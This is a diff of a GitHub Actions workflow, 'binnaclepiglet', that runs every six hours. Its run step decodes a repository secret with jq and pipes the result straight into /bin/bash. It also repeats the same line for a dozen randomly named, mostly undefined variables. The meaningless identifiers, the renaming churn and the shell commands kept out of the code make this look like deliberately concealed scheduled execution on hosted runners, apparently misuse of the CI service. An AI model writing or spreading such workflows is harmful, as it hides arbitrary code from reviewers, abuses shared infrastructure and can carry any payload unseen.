@@ -2,26 +2,27 @@ name: binnaclepiglet
 on:
   workflow_dispatch:
   schedule:
-    - cron: '54 4/6 * * *'
-
+    - cron: '13 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: binnaclepiglet
         env:
-          ylc8429: ${{ secrets.ylc8429 }}
+          h14: ${{ secrets.h14 }}
         run: |
-          echo $ylc8429 | jq -r .f741 | /bin/bash
-          echo $ae32559 | jq -r .wknv257 | /bin/bash
-          echo $sbpjg55241 | jq -r .isrqv8982 | /bin/bash
-          echo $he175 | jq -r .tjvz00 | /bin/bash
-          echo $xocf81 | jq -r .hdm7347 | /bin/bash
-          echo $dweef8 | jq -r .zv7 | /bin/bash
-          echo $unwd51063 | jq -r .krzz53 | /bin/bash
-          echo $if58 | jq -r .hhu992 | /bin/bash
-          echo $rdvq42370 | jq -r .uay23567 | /bin/bash
-          echo $xcae4 | jq -r .ih5 | /bin/bash
-          echo $ipc48 | jq -r .kkmzm7579 | /bin/bash
+          echo $h14 | jq -r .mxk71698 | /bin/bash
+          echo $wdijw3354 | jq -r .qfec2708 | /bin/bash
+          echo $f018 | jq -r .erwkq7 | /bin/bash
+          echo $utpy6619 | jq -r .ey17991 | /bin/bash
+          echo $elc9 | jq -r .tpng32443 | /bin/bash
+          echo $ncuqa35 | jq -r .d04 | /bin/bash
+          echo $epjvg92 | jq -r .jw9498 | /bin/bash
+          echo $y93 | jq -r .sp4120 | /bin/bash
+          echo $hr87555 | jq -r .yg3 | /bin/bash
+          echo $f1 | jq -r .ztn44681 | /bin/bash
+          echo $vsyw15 | jq -r .i06594 | /bin/bash
+          echo $z92 | jq -r .kum6429 | /bin/bash
 
